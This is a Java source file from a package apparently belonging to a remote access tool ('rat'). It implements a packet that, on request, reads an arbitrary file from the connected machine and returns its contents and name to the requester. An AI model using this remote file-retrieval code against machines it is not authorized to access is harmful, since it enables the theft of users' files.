/*******************************************************************************
 * Copyright 2016 Johannes Boczek
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *******************************************************************************/

package de.sogomn.rat.packet;

import java.io.File;

import de.sogomn.engine.util.FileUtils;
import de.sogomn.rat.ActiveConnection;

public final class DownloadFilePacket extends AbstractPingPongPacket {
	
	private String path;
	
	private byte[] data;
	private String fileName;
	
	public DownloadFilePacket(final String path) {
		this.path = path;
		
		type = REQUEST;
	}
	
	public DownloadFilePacket() {
		this("");
		
		type = DATA;
	}
	
	@Override
	protected void sendRequest(final ActiveConnection connection) {
		connection.writeUtf(path);
	}
	
	@Override
	protected void sendData(final ActiveConnection connection) {
		connection.writeInt(data.length);
		connection.write(data);
		connection.writeUtf(fileName);
	}
	
	@Override
	protected void receiveRequest(final ActiveConnection connection) {
		path = connection.readUtf();
	}
	
	@Override
	protected void receiveData(final ActiveConnection connection) {
		final int length = connection.readInt();
		
		data = new byte[length];
		connection.read(data);
		fileName = connection.readUtf();
		
	}
	
	@Override
	protected void executeRequest(final ActiveConnection connection) {
		final File file = new File(path);
		
		if (file.exists() && !file.isDirectory()) {
			fileName = file.getName();
			data = FileUtils.readExternalData(path);
			type = DATA;
			
			connection.addPacket(this);
		}
	}
	
	@Override
	protected void executeData(final ActiveConnection connection) {
		FileUtils.writeData(fileName, data);
	}
	
	public String getFileName() {
		return fileName;
	}
	
}
